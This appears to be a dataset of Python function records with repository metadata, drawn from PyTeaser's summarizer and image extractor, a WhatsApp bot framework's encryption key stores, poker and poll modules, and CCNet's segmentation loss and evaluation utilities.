{"docstring": "#score sentences based on different features\n\n", "func_signal": "def score(sentences, titleWords, keywords):\n", "code": "senSize = len(sentences)\nranks = Counter()\nfor i, s in enumerate(sentences):\n    sentence = split_words(s)\n    titleFeature = title_score(titleWords, sentence)\n    sentenceLength = length_score(sentence)\n    sentencePosition = sentence_position(i+1, senSize)\n    sbsFeature = sbs(sentence, keywords)\n    dbsFeature = dbs(sentence, keywords)\n    frequency = (sbsFeature + dbsFeature) / 2.0 * 10.0\n\n    #weighted average of scores from four categories\n    totalScore = (titleFeature*1.5 + frequency*2.0 +\n                  sentenceLength*1.0 + sentencePosition*1.0) / 4.0\n    ranks[s] = totalScore\nreturn ranks", "path": "PyTeaser/pyteaser.py", "commit_date": "2015-01-16 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"Determine if the object instance is of a protected type.\n\nObjects of protected types are preserved as-is when passed to\nforce_unicode(strings_only=True).\n\"\"\"\n", "func_signal": "def is_protected_type(obj):\n", "code": "return isinstance(obj, (\n    types.NoneType,\n    int, long,\n    datetime.datetime, datetime.date, datetime.time,\n    float, Decimal)\n)", "path": "PyTeaser/goose/utils/encoding.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"different sentence positions indicate different\nprobability of being an important sentence\"\"\"\n\n", "func_signal": "def sentence_position(i, size):\n", "code": "normalized = i*1.0 / size\nif 0 < normalized <= 0.1:\n    return 0.17\nelif 0.1 < normalized <= 0.2:\n    return 0.23\nelif 0.2 < normalized <= 0.3:\n    return 0.14\nelif 0.3 < normalized <= 0.4:\n    return 0.08\nelif 0.4 < normalized <= 0.5:\n    return 0.05\nelif 0.5 < normalized <= 0.6:\n    return 0.04\nelif 0.6 < normalized <= 0.7:\n    return 0.06\nelif 0.7 < normalized <= 0.8:\n    return 0.04\nelif 0.8 < normalized <= 0.9:\n    return 0.04\nelif 0.9 < normalized <= 1.0:\n    return 0.15\nelse:\n    return 0", "path": "PyTeaser/pyteaser.py", "commit_date": "2015-01-16 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "# check link tag\n", "func_signal": "def check_meta_tag(self):\n", "code": "image = self.check_link_tag()\nif image:\n    return image\n\n# check opengraph tag\nimage = self.check_opengraph_tag()\nif image:\n    return image", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nreturns the bytes of the image file on disk\n\"\"\"\n", "func_signal": "def get_local_image(self, src):\n", "code": "local_image = ImageUtils.store_image(None,\n                            self.link_hash, src, self.config)\nreturn local_image", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nWrites an image src http string to disk as a temporary file\nand returns the LocallyStoredImage object\nthat has the info you should need on the image\n\"\"\"\n# check for a cache hit already on disk\n", "func_signal": "def store_image(self, http_client, link_hash, src, config):\n", "code": "image = self.read_localfile(link_hash, src, config)\nif image:\n    return image\n\n# no cache found download the image\ndata = self.fetch(http_client, src)\nif data:\n    image = self.write_localfile(data, link_hash, src, config)\n    if image:\n        return image\n\nreturn None", "path": "PyTeaser/goose/images/utils.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\ntakes a list of image elements\nand filters out the ones with bad names\n\"\"\"\n", "func_signal": "def filter_bad_names(self, images):\n", "code": "good_images = []\nfor image in images:\n    if self.is_valid_filename(image):\n        good_images.append(image)\nreturn good_images if len(good_images) > 0 else None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nwill check the image src against a list\nof bad image files we know of like buttons, etc...\n\"\"\"\n", "func_signal": "def is_valid_filename(self, imageNode):\n", "code": "src = self.parser.getAttribute(imageNode, attr='src')\n\nif not src:\n    return False\n\nif self.badimages_names_re.search(src):\n    return False\n\nreturn True", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nloop through all the images and find the ones\nthat have the best bytez to even make them a candidate\n\"\"\"\n", "func_signal": "def get_images_bytesize_match(self, images):\n", "code": "cnt = 0\nMAX_BYTES_SIZE = 15728640\ngood_images = []\nfor image in images:\n    if cnt > 30:\n        return good_images\n    src = self.parser.getAttribute(image, attr='src')\n    src = self.build_image_path(src)\n    local_image = self.get_local_image(src)\n    if local_image:\n        bytes = local_image.bytes\n        if (bytes == 0 or bytes > self.images_min_bytes) \\\n                and bytes < MAX_BYTES_SIZE:\n            good_images.append(image)\n        else:\n            images.remove(image)\n    cnt += 1\nreturn good_images if len(good_images) > 0 else None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "# candidates node\n", "func_signal": "def get_videos(self):\n", "code": "self.candidates = self.parser.getElementsByTags(self.article.top_node, VIDEOS_TAGS)\n\n# loop all candidates\n# and check if src attribute belongs to a video provider\nfor candidate in self.candidates:\n    tag = self.parser.getTag(candidate)\n    attr = \"get_%s_tag\" % tag\n    if hasattr(self, attr):\n        movie = getattr(self, attr)(candidate)\n        if movie is not None and movie.provider is not None:\n            self.movies.append(movie)\n\n# append movies list to article\nself.article.movies = list(self.movies)", "path": "PyTeaser/goose/videos/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nalthough slow the best way to determine the best image is to download\nthem and check the actual dimensions of the image when on disk\nso we'll go through a phased approach...\n1. get a list of ALL images from the parent node\n2. filter out any bad image names that we know of (gifs, ads, etc..)\n3. do a head request on each file to make sure it meets\n   our bare requirements\n4. any images left over let's do a full GET request,\n   download em to disk and check their dimensions\n5. Score images based on different factors like height/width\n   and possibly things like color density\n\"\"\"\n", "func_signal": "def check_large_images(self, node, parent_depth_level, sibling_depth_level):\n", "code": "good_images = self.get_image_candidates(node)\n\nif good_images:\n    scored_images = self.fetch_images(good_images, parent_depth_level)\n    if scored_images:\n        highscore_image = sorted(scored_images.items(),\n                                key=lambda x: x[1], reverse=True)[0][0]\n        main_image = Image()\n        main_image.src = highscore_image.src\n        main_image.extraction_type = \"bigimage\"\n        main_image.confidence_score = 100 / len(scored_images) \\\n                            if len(scored_images) > 0 else 0\n        return main_image\n\ndepth_obj = self.get_depth_level(node, parent_depth_level, sibling_depth_level)\nif depth_obj:\n    return self.check_large_images(depth_obj.node,\n                    depth_obj.parent_depth, depth_obj.sibling_depth)\n\nreturn None", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\\\nreturns true if we think this is kind of a bannery dimension\nlike 600 / 100 = 6 may be a fishy dimension for a good image\n\"\"\"\n", "func_signal": "def is_banner_dimensions(self, width, height):\n", "code": "if width == height:\n    return False\n\nif width > height:\n    diff = float(width / height)\n    if diff > 5:\n        return True\n\nif height > width:\n    diff = float(height / width)\n    if diff > 5:\n        return True\n\nreturn False", "path": "PyTeaser/goose/images/extractors.py", "commit_date": "2013-12-15 00:00:00", "repo_name": "xiaoxu193/PyTeaser", "stars": 1171, "license": "mit", "language": "python", "size": 993}
{"docstring": "\"\"\"\n:param credentials:\n:param contacts: list of [jid ]\n:param encryptionEnabled:\n:return:\n\"\"\"\n", "func_signal": "def __init__(self, credentials, contacts, encryptionEnabled = False):\n", "code": "stackBuilder = YowStackBuilder()\n\nself.stack = stackBuilder \\\n    .pushDefaultLayers(encryptionEnabled) \\\n    .push(SyncLayer) \\\n    .build()\n\nself.stack.setProp(SyncLayer.PROP_CONTACTS, contacts)\nself.stack.setProp(YowAuthenticationProtocolLayer.PROP_PASSIVE, True)\nself.stack.setCredentials(credentials)", "path": "whatsapp-framework/libs/yowsup/yowsup/demos/contacts/stack.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type senderKeyName: SenderKeyName\n\"\"\"\n", "func_signal": "def loadSenderKey(self, senderKeyName):\n", "code": "q = \"SELECT record FROM sender_keys WHERE group_id = ? and sender_id = ?\"\ncursor = self.dbConn.cursor()\ncursor.execute(q, (senderKeyName.getGroupId(), senderKeyName.getSender().getName()))\n\nresult = cursor.fetchone()\nif not result:\n    return SenderKeyRecord()\nreturn SenderKeyRecord(serialized = result[0])", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/litesenderkeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nWrites lookup table to disk\n\"\"\"\n", "func_signal": "def write_table_to_disk(self, table, filepath):\n", "code": "with open(filepath, 'w') as f:\n    for prime_prod, rank in table.items():\n        f.write(str(prime_prod) +\",\"+ str(rank) + '\\n')", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type dbConn: Connection\n\"\"\"\n", "func_signal": "def __init__(self, dbConn):\n", "code": "self.dbConn = dbConn\ndbConn.execute(\"CREATE TABLE IF NOT EXISTS identities (_id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n               \"recipient_id INTEGER UNIQUE,\"\n               \"registration_id INTEGER, public_key BLOB, private_key BLOB,\"\n               \"next_prekey_id INTEGER, timestamp INTEGER);\")\n\n#identityKeyPairKeys = Curve.generateKeyPair()\n#self.identityKeyPair = IdentityKeyPair(IdentityKey(identityKeyPairKeys.getPublicKey()),\n#                                       identityKeyPairKeys.getPrivateKey())\n# self.localRegistrationId = KeyHelper.generateRegistrationId()", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/liteidentitykeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "#q = \"DELETE FROM signed_prekeys WHERE prekey_id = ?\"\n#self.dbConn.cursor().execute(q, (signedPreKeyId,))\n#self.dbConn.commit()\n\n", "func_signal": "def storeSignedPreKey(self, signedPreKeyId, signedPreKeyRecord):\n", "code": "q = \"INSERT INTO signed_prekeys (prekey_id, record) VALUES(?,?)\"\ncursor = self.dbConn.cursor()\nrecord = signedPreKeyRecord.serialize()\ncursor.execute(q, (signedPreKeyId, buffer(record) if sys.version_info < (2,7) else record))\nself.dbConn.commit()", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/litesignedprekeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nPair, Two Pair, Three of a Kind, Full House, and 4 of a Kind.\n\"\"\"\n", "func_signal": "def multiples(self):\n", "code": "backwards_ranks = list(range(len(Card.INT_RANKS) - 1, -1, -1))\n\n# 1) Four of a Kind\nrank = LookupTable.MAX_STRAIGHT_FLUSH + 1\n\n# for each choice of a set of four rank\nfor i in backwards_ranks:\n\n    # and for each possible kicker rank\n    kickers = backwards_ranks[:]\n    kickers.remove(i)\n    for k in kickers:\n        product = Card.PRIMES[i]**4 * Card.PRIMES[k]\n        self.unsuited_lookup[product] = rank\n        rank += 1\n\n# 2) Full House\nrank = LookupTable.MAX_FOUR_OF_A_KIND + 1\n\n# for each three of a kind\nfor i in backwards_ranks:\n\n    # and for each choice of pair rank\n    pairranks = backwards_ranks[:]\n    pairranks.remove(i)\n    for pr in pairranks:\n        product = Card.PRIMES[i]**3 * Card.PRIMES[pr]**2\n        self.unsuited_lookup[product] = rank\n        rank += 1\n\n# 3) Three of a Kind\nrank = LookupTable.MAX_STRAIGHT + 1\n\n# pick three of one rank\nfor r in backwards_ranks:\n\n    kickers = backwards_ranks[:]\n    kickers.remove(r)\n    gen = itertools.combinations(kickers, 2)\n\n    for kickers in gen:\n\n        c1, c2 = kickers\n        product = Card.PRIMES[r]**3 * Card.PRIMES[c1] * Card.PRIMES[c2]\n        self.unsuited_lookup[product] = rank\n        rank += 1\n\n# 4) Two Pair\nrank = LookupTable.MAX_THREE_OF_A_KIND + 1\n\ntpgen = itertools.combinations(backwards_ranks, 2)\nfor tp in tpgen:\n\n    pair1, pair2 = tp\n    kickers = backwards_ranks[:]\n    kickers.remove(pair1)\n    kickers.remove(pair2)\n    for kicker in kickers:\n\n        product = Card.PRIMES[pair1]**2 * Card.PRIMES[pair2]**2 * Card.PRIMES[kicker]\n        self.unsuited_lookup[product] = rank\n        rank += 1\n\n# 5) Pair\nrank = LookupTable.MAX_TWO_PAIR + 1\n\n# choose a pair\nfor pairrank in backwards_ranks:\n\n    kickers = backwards_ranks[:]\n    kickers.remove(pairrank)\n    kgen = itertools.combinations(kickers, 3)\n\n    for kickers in kgen:\n\n        k1, k2, k3 = kickers\n        product = Card.PRIMES[pairrank]**2 * Card.PRIMES[k1] \\\n                * Card.PRIMES[k2] * Card.PRIMES[k3]\n        self.unsuited_lookup[product] = rank\n        rank += 1", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nCalculates lookup tables\n\"\"\"\n# create dictionaries\n", "func_signal": "def __init__(self):\n", "code": "self.flush_lookup = {}\nself.unsuited_lookup = {}\n\n# create the lookup table in piecewise fashion\nself.flushes()  # this will call straights and high cards method,\n                # we reuse some of the bit sequences\nself.multiples()", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type entity: IqProtocolEntity\n\"\"\"\n", "func_signal": "def processIqRegistry(self, entity):\n", "code": "if entity.getTag() == \"iq\":\n    iq_id = entity.getId()\n    if iq_id in self.iqRegistry:\n        originalIq, successClbk, errorClbk = self.iqRegistry[iq_id]\n        del self.iqRegistry[iq_id]\n\n        if entity.getType() ==  IqProtocolEntity.TYPE_RESULT and successClbk:\n            successClbk(entity, originalIq)\n        elif entity.getType() == IqProtocolEntity.TYPE_ERROR and errorClbk:\n            errorClbk(entity, originalIq)\n        return True\n\nreturn False", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/interface/interface.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nBit hack from here:\nhttp://www-graphics.stanford.edu/~seander/bithacks.html#NextBitPermutation\n\nGenerator even does this in poker order rank \nso no need to sort when done! Perfect.\n\"\"\"\n", "func_signal": "def get_lexographically_next_bit_sequence(self, bits):\n", "code": "t = (bits | (bits - 1)) + 1 \nnext = t | ((((t & -t) // (bits & -bits)) >> 1) - 1)  \nyield next\nwhile True:\n    t = (next | (next - 1)) + 1 \n    next = t | ((((t & -t) // (next & -next)) >> 1) - 1)\n    yield next", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "# Finish poll if user already has one in this conversation\n", "func_signal": "def __init__(self, conversation, creator, title, identifier=\"\u270b\"):\n", "code": "self.finish_my_poll(creator, conversation)\n\n# Basic attributes\nself.title = title\nself.voters = []\n\n# Conversation where the poll was created\nself.conversation = conversation\n# Vote identifier\nself.identifier = identifier\n# who object\nself.creator = creator", "path": "whatsapp-framework/modules/poll/poll.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type dbConn: Connection\n\"\"\"\n", "func_signal": "def __init__(self, dbConn):\n", "code": "self.dbConn = dbConn\ndbConn.execute(\"CREATE TABLE IF NOT EXISTS signed_prekeys (_id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n               \"prekey_id INTEGER UNIQUE, timestamp INTEGER, record BLOB);\")", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/litesignedprekeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type protocolTreeNode: ProtocolTreeNode\n\"\"\"\n", "func_signal": "def receive(self, protocolTreeNode):\n", "code": "if not self.processIqRegistry(protocolTreeNode):\n    if protocolTreeNode.tag == \"message\" or protocolTreeNode.tag == \"media\":\n        self.onMessage(protocolTreeNode)\n    elif not protocolTreeNode.tag == \"receipt\":\n        #receipts will be handled by send layer\n        self.toUpper(protocolTreeNode)\n\n    # elif protocolTreeNode.tag == \"iq\":\n    #     if protocolTreeNode.getChild(\"encr_media\"):\n    #         protocolTreeNode.addChild(\"media\", {\n    #             \"url\": protocolTreeNode[\"url\"],\n    #             \"ip\": protocolTreeNode[\"ip\"],\n    #         })\n    #         self.toUpper(protocolTreeNode)\n    #         return", "path": "whatsapp-framework/libs/yowsup/yowsup/layers/axolotl/layer_receive.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "#self.removePreKey(preKeyId)\n", "func_signal": "def storePreKey(self, preKeyId, preKeyRecord):\n", "code": "q = \"INSERT INTO prekeys (prekey_id, record) VALUES(?,?)\"\ncursor = self.dbConn.cursor()\nserialized = preKeyRecord.serialize()\ncursor.execute(q, (preKeyId, buffer(serialized) if sys.version_info < (2,7) else serialized))\nself.dbConn.commit()", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/liteprekeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nUnique five card sets. Straights and highcards. \n\nReuses bit sequences from flush calculations.\n\"\"\"\n", "func_signal": "def straight_and_highcards(self, straights, highcards):\n", "code": "rank = LookupTable.MAX_FLUSH + 1\n\nfor s in straights:\n    prime_product = Card.prime_product_from_rankbits(s)\n    self.unsuited_lookup[prime_product] = rank\n    rank += 1\n\nrank = LookupTable.MAX_PAIR + 1\nfor h in highcards:\n    prime_product = Card.prime_product_from_rankbits(h)\n    self.unsuited_lookup[prime_product] = rank\n    rank += 1", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:param layer: An optional layer to put on top of default stack\n:param axolotl: E2E encryption enabled/ disabled\n:return: YowStack\n\"\"\"\n\n", "func_signal": "def getDefaultStack(layer = None, axolotl = False, groups = True, media = True, privacy = True, profiles = True):\n", "code": "allLayers = YowStackBuilder.getDefaultLayers(axolotl, groups = groups, media=media,privacy=privacy, profiles=profiles)\nif layer:\n    allLayers = allLayers + (layer,)\n\n\nreturn YowStack(allLayers, reversed = False)", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/stacks/yowstack.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "# If haven't already voted in this poll\n", "func_signal": "def put_vote(self, voter):\n", "code": "if not any(voter.who == v.who for v in self.voters):\n    self.voters.append(voter)", "path": "whatsapp-framework/modules/poll/poll.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type id: int\n:type iteration: int\n:type chainKey: bytearray\n:type signatureKey: ECPublicKey\n\"\"\"\n\n\n", "func_signal": "def __init__(self, id=None, iteration=None, chainKey=None, signatureKey=None, serialized=None):\n", "code": "assert bool(id is not None and iteration is not None and chainKey is not None and signatureKey is not None)\\\n       ^ bool(serialized),\\\n    \"Either pass arguments or serialized data\"\n\nif serialized:\n    try:\n        messageParts = ByteUtil.split(serialized, 1, len(serialized)- 1)\n        version = messageParts[0][0]\n        message = messageParts[1]\n\n\n        if ByteUtil.highBitsToInt(version) < 3:\n            raise LegacyMessageException(\"Legacy message: %s\" % ByteUtil.highBitsToInt(version))\n\n        if ByteUtil.highBitsToInt(version) > self.__class__.CURRENT_VERSION:\n            raise InvalidMessageException(\"Unknown version: %s\" % ByteUtil.highBitsToInt(version))\n\n\n        distributionMessage = whisperprotos.SenderKeyDistributionMessage()\n        distributionMessage.ParseFromString(message)\n\n        if distributionMessage.id is None or distributionMessage.iteration is None\\\n            or distributionMessage.chainKey is None or distributionMessage.signingKey is None:\n            raise InvalidMessageException(\"Incomplete message\")\n\n        self.serialized = serialized\n\n        self.id           = distributionMessage.id\n        self.iteration    = distributionMessage.iteration\n        self.chainKey     = distributionMessage.chainKey\n        self.signatureKey = Curve.decodePoint(bytearray(distributionMessage.signingKey), 0)\n\n    except Exception as e:\n        raise InvalidMessageException(e)\nelse:\n    version = [ByteUtil.intsToByteHighAndLow(self.__class__.CURRENT_VERSION, self.__class__.CURRENT_VERSION)]\n    self.id = id\n    self.iteration = iteration\n    self.chainKey = chainKey\n    self.signatureKey = signatureKey\n    message = whisperprotos.SenderKeyDistributionMessage()\n    message.id = id\n    message.iteration = iteration\n    message.chainKey= bytes(chainKey)\n    message.signingKey = signatureKey.serialize()\n    message = message.SerializeToString()\n    self.serialized = bytes(ByteUtil.combine(version, message))", "path": "whatsapp-framework/libs/python-axolotl/axolotl/protocol/senderkeydistributionmessage.py", "commit_date": "2017-10-08 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\nStraight flushes and flushes. \n\nLookup is done on 13 bit integer (2^13 > 7462):\nxxxbbbbb bbbbbbbb => integer hand index\n\"\"\"\n\n# straight flushes in rank order\n", "func_signal": "def flushes(self):\n", "code": "straight_flushes = [\n    7936, # int('0b1111100000000', 2), # royal flush\n    3968, # int('0b111110000000', 2),\n    1984, # int('0b11111000000', 2),\n    992, # int('0b1111100000', 2),\n    496, # int('0b111110000', 2),\n    248, # int('0b11111000', 2),\n    124, # int('0b1111100', 2),\n    62, # int('0b111110', 2),\n    31, # int('0b11111', 2),\n    4111 # int('0b1000000001111', 2) # 5 high\n]\n\n# now we'll dynamically generate all the other\n# flushes (including straight flushes)\nflushes = []\ngen = self.get_lexographically_next_bit_sequence(int('0b11111', 2))\n\n# 1277 = number of high cards\n# 1277 + len(str_flushes) is number of hands with all cards unique rank\nfor i in range(1277 + len(straight_flushes) - 1): # we also iterate over SFs\n    # pull the next flush pattern from our generator\n    f = next(gen)\n\n    # if this flush matches perfectly any\n    # straight flush, do not add it\n    notSF = True\n    for sf in straight_flushes:\n        # if f XOR sf == 0, then bit pattern \n        # is same, and we should not add\n        if not f ^ sf:\n            notSF = False\n\n    if notSF:\n        flushes.append(f)\n\n# we started from the lowest straight pattern, now we want to start ranking from\n# the most powerful hands, so we reverse\nflushes.reverse()\n\n# now add to the lookup map:\n# start with straight flushes and the rank of 1\n# since theyit is the best hand in poker\n# rank 1 = Royal Flush!\nrank = 1\nfor sf in straight_flushes:\n    prime_product = Card.prime_product_from_rankbits(sf)\n    self.flush_lookup[prime_product] = rank\n    rank += 1\n\n# we start the counting for flushes on max full house, which\n# is the worst rank that a full house can have (2,2,2,3,3)\nrank = LookupTable.MAX_FULL_HOUSE + 1\nfor f in flushes:\n    prime_product = Card.prime_product_from_rankbits(f)\n    self.flush_lookup[prime_product] = rank\n    rank += 1\n\n# we can reuse these bit sequences for straights\n# and high cards since they are inherently related\n# and differ only by context \nself.straight_and_highcards(straight_flushes, flushes)", "path": "whatsapp-framework/modules/poker/deuces/lookup.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "\"\"\"\n:type dbConn: Connection\n\"\"\"\n", "func_signal": "def __init__(self, dbConn):\n", "code": "self.dbConn = dbConn\ndbConn.execute(\"CREATE TABLE IF NOT EXISTS prekeys (_id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n               \"prekey_id INTEGER UNIQUE, sent_to_server BOOLEAN, record BLOB);\")", "path": "whatsapp-framework/libs/yowsup/yowsup/yowsup/layers/axolotl/store/sqlite/liteprekeystore.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "# Set received (double v) and add to ack queue\n", "func_signal": "def on_message(self, message_entity):\n", "code": "mac.receive_message(self, message_entity)\n\n# Make message\nmessage = Message(message_entity)\nif message.valid:\n    signals.message_received.send(message)\n    if helper.is_command(message.message):\n        signals.command_received.send(message)\n    \nmac.disconnect(self)", "path": "whatsapp-framework/app/layer.py", "commit_date": "2017-12-06 00:00:00", "repo_name": "danielcardeenas/whatsapp-framework", "stars": 1138, "license": "None", "language": "python", "size": 26334}
{"docstring": "# downsample 1/8\n", "func_signal": "def find_threshold(self, np_predict, np_target):\n", "code": "factor = self.factor\npredict = nd.zoom(np_predict, (1.0, 1.0, 1.0/factor, 1.0/factor), order=1)\ntarget = nd.zoom(np_target, (1.0, 1.0/factor, 1.0/factor), order=0)\n\nn, c, h, w = predict.shape\nmin_kept = self.min_kept // (factor*factor) #int(self.min_kept_ratio * n * h * w)\n\ninput_label = target.ravel().astype(np.int32)\ninput_prob = np.rollaxis(predict, 1).reshape((c, -1))\n\nvalid_flag = input_label != self.ignore_label\nvalid_inds = np.where(valid_flag)[0]\nlabel = input_label[valid_flag]\nnum_valid = valid_flag.sum()\nif min_kept >= num_valid:\n    threshold = 1.0\nelif num_valid > 0:\n    prob = input_prob[:,valid_flag]\n    pred = prob[label, np.arange(len(label), dtype=np.int32)]\n    threshold = self.thresh\n    if min_kept > 0:\n        k_th = min(len(pred), min_kept)-1\n        new_array = np.partition(pred, k_th)\n        new_threshold = new_array[k_th]\n        if new_threshold > self.thresh:\n            threshold = new_threshold\nreturn threshold", "path": "CCNet/utils/loss.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"\nCalcute the confusion matrix by given label and pred\n:param gt_label: the ground truth label\n:param pred_label: the pred label\n:param class_num: the nunber of class\n:return: the confusion matrix\n\"\"\"\n", "func_signal": "def get_confusion_matrix(gt_label, pred_label, class_num):\n", "code": "index = (gt_label * class_num + pred_label).astype('int32')\nlabel_count = np.bincount(index)\nconfusion_matrix = np.zeros((class_num, class_num))\n\nfor i_label in range(class_num):\n    for i_pred_label in range(class_num):\n        cur_index = i_label * class_num + i_pred_label\n        if cur_index < len(label_count):\n            confusion_matrix[i_label, i_pred_label] = label_count[cur_index]\n\nreturn confusion_matrix", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Inverse preprocessing of the batch of images.\n   Add the mean vector and convert from BGR to RGB.\n   \nArgs:\n  imgs: batch of input images.\n  num_images: number of images to apply the inverse transformations on.\n  img_mean: vector of mean colour values.\n  \nReturns:\n  The batch of the size num_images with the same spatial dimensions as the input.\n\"\"\"\n", "func_signal": "def inv_preprocess(imgs, num_images, img_mean):\n", "code": "imgs = imgs.data.cpu().numpy()\nn, c, h, w = imgs.shape\nassert(n >= num_images), 'Batch size %d should be greater or equal than number of images to save %d.' % (n, num_images)\noutputs = np.zeros((num_images, h, w, c), dtype=np.uint8)\nfor i in range(num_images):\n    outputs[i] = (np.transpose(imgs[i], (1,2,0)) + img_mean).astype(np.uint8)\nreturn outputs", "path": "CCNet/utils/utils.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
